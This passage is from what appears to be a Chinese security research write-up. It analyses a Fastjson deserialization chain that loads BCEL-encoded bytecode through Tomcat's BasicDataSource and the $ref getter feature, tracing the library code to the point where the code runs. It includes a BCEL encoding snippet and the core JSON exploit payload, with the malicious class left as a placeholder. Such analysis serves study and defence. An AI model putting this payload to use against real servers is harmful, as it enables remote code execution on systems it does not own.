            JavaClass cls = Repository.lookupClass(Exp.class);
            String code = Utility.encode(cls.getBytes(), true);
            code = "$$BCEL$$" + code;
            new ClassLoader().loadClass(code).newInstance();
            System.out.println(code);
        }
    }
关于`com.sun.org.apache.bcel.internal.util.ClassLoader`参考[P师傅(phith0n)](https://github.com/phith0n)的《Java安全漫谈》
BCEL的全名是Apache Commons BCEL，Apache
Commons项目下的一个子项目，包含在JDK的原生库中。我们可以通过BCEL提供的两个类 Repository 和 Utility 来利用：
Repository 用于将一个Java Class先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码； Utility
用于将原生的字节码转换成BCEL格式的字节码。
生成的BCEL格式大概如下：
    $$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$......
将这种格式的字符串，作为“字节码”传入`new
ClassLoader().loadClass(code).newInstance();`将会被实例化，当我们在Fastjson反序列化中构造出这种链，将会造成反序列化漏洞
回到Payload，开头一部分用于绕Fastjson黑白名单，没有什么特殊的意义，核心部分如下：
    "x" : {
        "name": {
            "@type" : "java.lang.Class",
            "val"   : "com.sun.org.apache.bcel.internal.util.ClassLoader"
        },
        "y": {
            "@type":"com.alibaba.fastjson.JSONObject",
            "c": {
                "@type":"org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type" : "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName":"!!!Payload!!!",
                "$ref": "$.x.y.c.connection"
            }
        }
    }
这个版本利用的是`$ref`这个特性：当fastjson版本>=1.2.36时，我们可以使用`$ref`的方式来调用任意的getter，比如这个Payload调用的是`x.y.c.connection`，x是这个大对象，最终调用的是c对象的connection方法，也就是`BasicDataSource.connection`
参考代码`com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze:591`
    if ("$ref" == key && context != null) {
        // 传入的ref是$.x.y.c.connection，匹配到else
        if ("@".equals(ref)) {
            ...
        } else if ("..".equals(ref)) {
            ...
        } else if ("$".equals(ref)) {
            ...
        } else {
            Object refObj = parser.resolveReference(ref);
            if (refObj != null) {
                object = refObj;
            } else {
                // 将$.x.y.c.connection加入到Task
                parser.addResolveTask(new ResolveTask(context, ref));
                parser.resolveStatus = DefaultJSONParser.NeedToResolve;
            }
        }
    }
    // 处理后设置到context    
    parser.setContext(context, object, fieldName);
漏洞的触发点在`com.alibaba.fastjson.JSON.parse:154`
    parser.handleResovleTask(value);
跟入`com.alibaba.fastjson.parser.DefaultJSONParser.handleResovleTask:1465`
    if (ref.startsWith("$")) {
        refValue = getObject(ref);
        if (refValue == null) {
            try {
                // 看到eval感觉有东西
                refValue = JSONPath.eval(value, ref);
            } catch (JSONPathException ex) {
                // skip
            }
        }
    }
跟入`JSONPath.eval`，这里的`segement`数组中的是`[x,y,c,connection]`
    public Object eval(Object rootObject) {
        if (rootObject == null) {
            return null;
        }
        init();
        Object currentObject = rootObject;
        for (int i = 0; i  results = new ArrayList();
            path.deepScan(currentObject, propertyName, results);
            return results;
        } else {
            // return path.getPropertyValue(currentObject, propertyName, true);
            return path.getPropertyValue(currentObject, propertyName, propertyNameHash);
        }
    }
继续跟入`path.getPropertyValue`
    protected Object getPropertyValue(Object currentObject, String propertyName, long propertyNameHash) {
        if (currentObject == null) {
            return null;
        }
        if (currentObject instanceof Map) {
            Map map = (Map) currentObject;
            Object val = map.get(propertyName);
            if (val == null && SIZE == propertyNameHash) {
                val = map.size();
            }
            return val;
        }
        final Class currentClass = currentObject.getClass();
        JavaBeanSerializer beanSerializer = getJavaBeanSerializer(currentClass);
        if (beanSerializer != null) {
            try {
                // 最后一次循环到达这里
                return beanSerializer.getFieldValue(currentObject, propertyName, propertyNameHash, false);
            } catch (Exception e) {
                throw new JSONPathException("jsonpath error, path " + path + ", segement " + propertyName, e);
            }
        }
跟入`com.alibaba.fastjson.serializer.JavaBeanSerializer:439`
    public Object getFieldValue(Object object, String key, long keyHash, boolean throwFieldNotFoundException) {
        FieldSerializer fieldDeser = getFieldSerializer(keyHash);
        ......
        // 跟入
        return fieldDeser.getPropertyValue(object);
    }
跟入`com.alibaba.fastjson.serializer.FieldSerializer:145`
    public Object getPropertyValue(Object object) throws InvocationTargetException, IllegalAccessException {
        Object propertyValue =  fieldInfo.get(object);
到达`com.alibaba.fastjson.util.FieldInfo`，达到最终触发点：`method.invoke`
    public Object get(Object javaObject) throws IllegalAccessException, InvocationTargetException {
        return method != null
                ? method.invoke(javaObject)
                : field.get(javaObject);
    }
看到这里的javaObject正是`BasicDataSouce`
回到`BasicDataSource`本身
    public Connection getConnection() throws SQLException {
        if (Utils.IS_SECURITY_ENABLED) {
            // 跟入
            final PrivilegedExceptionAction action = new PaGetConnection();
            try {
                return AccessController.doPrivileged(action);
            } catch (final PrivilegedActionException e) {
                final Throwable cause = e.getCause();
                if (cause instanceof SQLException) {
                    throw (SQLException) cause;
                }
                throw new SQLException(e);
            }
        }
        return createDataSource().getConnection();
    }
        private class PaGetConnection implements PrivilegedExceptionAction {
            @Override
            public Connection run() throws SQLException {
                // 跟入createDataSource()
                return createDataSource().getConnection();
            }
        }
    // 继续跟入createConnectionFactory()
    final ConnectionFactory driverConnectionFactory = createConnectionFactory();
最终触发点，其中`driverClassName`和`driverClassLoader`都是可控的，由用户输入，指定ClassLoader为`com.sun.org.apache.bcel.internal.util.ClassLoader`，设置ClassName为`BCEL...`这种格式后，在`newInstance`方法执行后被实例化。第二个参数`initial`为true时，类加载后将会直接执行`static{}`块中的代码。
    if (driverClassLoader == null) {
        driverFromCCL = Class.forName(driverClassName);
    } else {
        driverFromCCL = Class.forName(
            driverClassName, true, driverClassLoader);
    }
    ...
    driverFromCCL = Thread.currentThread().getContextClassLoader().loadClass(driverClassName);
    ...
    driverToUse = (Driver) driverFromCCL.newInstance();
总结：
  * 不需要出网，不需要开启特殊的参数，适用范围较广
  * 目标需要引入tomcat依赖，虽说比较常见，但也是一种限制